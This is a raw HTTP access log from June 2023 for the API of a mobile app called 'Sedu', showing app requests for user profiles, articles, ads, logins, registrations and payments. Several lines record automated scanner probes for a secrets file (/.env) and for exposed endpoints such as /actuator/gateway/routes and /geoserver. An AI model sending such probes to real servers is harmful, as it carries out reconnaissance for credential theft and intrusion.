::1 - - [26/Jun/2023:02:01:39 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:02:01:39 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:01:39 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:05:33 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:05:33 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:05:33 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:05:42 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:07:40 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:14:43 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:29:12 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [26/Jun/2023:02:30:12 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:30:12 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:30:12 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:30:29 +0000] "GET /api/v1/articles/642d4efb7c1330814fb762cf? HTTP/1.0" 200 10100 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:39:16 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 229 "-" "Sedu/1 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [26/Jun/2023:02:39:35 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:39:35 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [26/Jun/2023:02:41:31 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:42:43 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:45:17 +0000] "GET /cdn-cgi/trace HTTP/1.0" 404 152 "-" "python-requests/2.29.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:47:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [26/Jun/2023:02:47:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [26/Jun/2023:02:47:44 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:48:19 +0000] "GET /Public/home/js/check.js HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
::1 - - [26/Jun/2023:02:48:20 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.0" 404 172 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
::ffff:127.0.0.1 - - [26/Jun/2023:02:51:02 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:51:02 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:51:02 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:51:06 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:51:06 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:51:06 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:02:51:38 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [26/Jun/2023:02:51:39 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [26/Jun/2023:02:53:56 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 231 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:02:53:56 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:53:56 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:00:52 +0000] "GET /geoserver HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [26/Jun/2023:03:02:04 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:02:05 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:03:02:05 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:03:02:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:03:02:37 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "-"
::ffff:127.0.0.1 - - [26/Jun/2023:03:02:39 +0000] "GET /sitemap.xml HTTP/1.0" 404 150 "-" "-"
::ffff:127.0.0.1 - - [26/Jun/2023:03:04:21 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:03:04:21 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:04:21 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:10:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:10:34 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:11:40 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:11:51 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:11:52 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:11:52 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:11:59 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:12:17 +0000] "POST /api/v1/users/register HTTP/1.0" 500 253 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:12:30 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:12:44 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:12:44 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:12:52 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:03:20:11 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:20:35 +0000] "POST /api/v1/users/register HTTP/1.0" 500 250 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:21:07 +0000] "POST /api/v1/users/register HTTP/1.0" 200 468 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:21:07 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 194 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:21:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:21:19 +0000] "POST /api/v1/users/invoice/64990422a32e8316d82808b5 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:21:20 +0000] "GET /api/v1/wallets/6499042fa32e8316d82808ba? HTTP/1.0" 200 16348 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:21:53 +0000] "GET /api/v1/users/callbacks/64990422a32e8316d82808b5/20000?qpay_payment_id=862060941636460 HTTP/1.0" 200 233 "-" "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
::ffff:127.0.0.1 - - [26/Jun/2023:03:21:55 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 233 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:21:55 +0000] "GET /api/v1/wallets/6499042fa32e8316d82808ba? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:22:02 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:22:02 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:22:02 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:22:10 +0000] "GET /api/v1/articles/642d55507c1330814fb76325? HTTP/1.0" 200 3410 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:23:25 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:03:23:26 +0000] "GET /api/v1/articles/642d76ab7c1330814fb763c4? HTTP/1.0" 200 12382 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:31:58 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 228 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:32:03 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:32:11 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:32:11 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:32:47 +0000] "POST /api/v1/users/register HTTP/1.0" 200 460 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:32:47 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 186 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:32:53 +0000] "GET /api/v1/users/logout? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:32:53 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:33:07 +0000] "POST /api/v1/users/login HTTP/1.0" 200 460 "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:33:07 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:33:10 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:33:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:33:31 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1327.0.4 Darwin/21.2.0"
::1 - - [26/Jun/2023:03:38:11 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:38:11 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:38:12 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:38:50 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:39:36 +0000] "GET /config/getuser?index=0 HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:39:44 +0000] "GET /api/v1/articles/642e38d27c1330814fb764c0? HTTP/1.0" 200 2965 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:42:27 +0000] "GET /api/v1/articles/642e3a0a7c1330814fb764d8? HTTP/1.0" 200 2171 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:42:48 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:03:45:13 +0000] "GET /api/v1/articles/642e3a0a7c1330814fb764d8? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:45:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:45:13 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:45:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:45:13 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:51:10 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:03:56:53 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:56:53 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:56:53 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:57:03 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:57:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::1 - - [26/Jun/2023:03:59:33 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:59:45 +0000] "POST /api/v1/users/invoice/ HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:59:46 +0000] "POST /api/v1/users/invoice/ HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:59:51 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:59:53 +0000] "POST /api/v1/users/invoice/ HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:03:59:55 +0000] "POST /api/v1/users/invoice/ HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:03:59:56 +0000] "POST /api/v1/users/invoice/ HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:00:13 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:00:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:00:14 +0000] "GET /api/v1/users/logout? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:00:22 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:00:28 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:00:28 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:00:37 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:00:37 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:00:43 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:00:43 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:01:02 +0000] "POST /api/v1/users/register HTTP/1.0" 500 251 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:01:10 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:01:10 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:01:16 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:01:16 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:01:24 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:01:28 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:02:45 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:02:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:02:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:02:46 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:02:54 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:02:54 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:02:54 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:04:20:17 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:21:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:04:21:45 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:21:45 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:25:25 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 225 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:04:25:25 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:25:25 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:27:04 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:04:27:10 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 231 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:38:55 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:38:55 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:38:55 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:38:55 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:45:54 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:45:54 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:45:54 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:45:54 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:46:18 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:46:18 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:46:18 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:46:18 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:46:31 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:46:31 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:46:31 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:46:31 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:46:43 +0000] "GET /api/v1/articles/642d4efb7c1330814fb762cf? HTTP/1.0" 200 10100 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::ffff:127.0.0.1 - - [26/Jun/2023:04:48:34 +0000] "GET /api/v1/articles/642d55507c1330814fb76325? HTTP/1.0" 200 3410 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
::1 - - [26/Jun/2023:04:50:21 +0000] "GET /api/v1/articles/642d55f77c1330814fb7634f? HTTP/1.0" 200 7052 "-" "Sedu/1 CFNetwork/1406.0.4 Darwin/22.4.0"
